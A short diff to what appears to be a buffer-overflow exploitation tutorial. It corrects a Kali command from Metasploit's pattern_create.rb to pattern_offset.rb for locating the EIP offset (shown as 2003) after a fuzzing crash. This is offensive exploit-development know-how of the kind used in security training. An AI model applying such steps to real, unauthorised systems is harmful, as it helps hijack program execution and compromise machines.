@@ -137,8 +137,8 @@ in Immunity Debugger copy the EIP info (should be hexadecimal numbers).
 
 #### Kali Linux: 
 ```
-# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <"Fuzzing crashed at %s bytes"> -q <EIP info>
-# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 -q 386F4337
+# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <"Fuzzing crashed at %s bytes"> -q <EIP info>
+# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
 ```
 [*] Exact match found at offset 2003		<== needed so we can control the EIP
 
